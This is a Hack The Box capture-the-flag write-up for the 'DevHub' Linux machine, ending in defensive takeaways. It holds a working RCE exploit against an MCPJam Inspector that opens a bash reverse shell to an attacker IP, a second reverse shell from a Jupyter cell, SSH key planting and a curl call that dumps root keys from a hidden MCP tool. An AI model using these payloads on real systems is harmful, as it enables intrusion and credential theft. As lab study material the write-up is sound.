DevHub

Medium Linux ✓ Pwned
Date 2026-06-06
OS Linux — Ubuntu 24.04
Season HTB Season 11
CVE CVE-2026-23744 (MCPJam Inspector RCE)

Summary

DevHub is themed as an internal developer platform, and the chain reads like a realistic compromise of a modern AI/MCP toolchain:

  1. Initial access — An exposed MCPJam Inspector (v1.4.2) on port 6274 is vulnerable to CVE-2026-23744: an unauthenticated RCE through its /api/mcp/connect endpoint, which passes a command/args pair straight to a process spawner.
  2. Lateral movement — A Jupyter Lab token leaks in plaintext ps aux arguments. An SSH local port-forward exposes the localhost-bound Jupyter UI, and a notebook cell yields a shell as analyst.
  3. Privilege escalation — A root-owned Flask "OPSMCP" server exposes a hidden ops._admin_dump endpoint (not in /tools/list) that returns the root SSH private key.

The port-80 homepage helpfully enumerates internal services: the MCP Inspector on 6274, an "Analytics Dashboard" on localhost:8888 (Jupyter), and a code repo in maintenance mode. Information disclosure on the landing page is the first thread to pull.

Initial Access — CVE-2026-23744

MCPJam Inspector is a debugging tool for tracing JSON-RPC across Model Context Protocol systems. Version 1.4.2 exposes unauthenticated REST endpoints, and /api/mcp/connect forwards a command + args pair to the OS process spawner without sanitisation. The key detail is that command and args must be separate JSON fields.

import requests

target = "http://devhub.htb:6274"
payload = {
    "serverConfig": {
        "command": "/bin/bash",
        "args": ["-c", "bash -i >& /dev/tcp/10.10.15.27/4444 0>&1"],
        "env": {}
    },
    "serverId": "pwn"
}
r = requests.post(f"{target}/api/mcp/connect", json=payload, timeout=15)
print(r.status_code, r.text)

Gotcha: the server always returns HTTP 500 ("Connection closed") — the MCP handshake fails, but the shell already connected. Don't read 500 as failure; verify blind RCE via the callback.

Lateral Movement — mcp-dev → analyst

Jupyter is bound to 127.0.0.1, so a tunnel is required. Plant a key for mcp-dev, then forward the port:

# attacker
ssh-keygen -t ed25519 -f ~/.ssh/devhub_key -N ""
# on target as mcp-dev
mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
# attacker — local port forward
ssh -i ~/.ssh/devhub_key -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb -N

Authenticate to Jupyter with the leaked token and run a cell to pop a shell as analyst:

import os
os.system('bash -c "bash -i >& /dev/tcp/10.10.15.27/5555 0>&1"')

Privilege Escalation — analyst → root

As analyst, the root-owned /opt/opsmcp/server.py is readable. Source review reveals a hardcoded API key and a hidden tool that never appears in /tools/list but is still callable via /tools/call:

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}

Calling it with target=ssh_keys dumps the root private key:

curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'

The returned key has literal \n escapes (JSON encoding) — fix them, then SSH in as root:

echo '<key_data>' | sed 's/\\n/\n/g' > root.key
chmod 600 root.key
ssh -i root.key root@devhub.htb   # uid=0(root)

Defensive Takeaways

  • Treat AI/MCP and developer tooling as production attack surface. It often ships with no auth and aggressive defaults.
  • Bind to 127.0.0.1 unless external access is truly required — and don't assume loopback is safe (see my localhost-is-not-a-boundary notes).
  • Secrets in process arguments are world-readable via ps. Pass tokens via environment files or stdin, never argv.
  • Obscurity is not access control. A hidden endpoint is still reachable; remove debug/"emergency" backdoors before production.
  • Least privilege: the OPSMCP server had no business running as root.
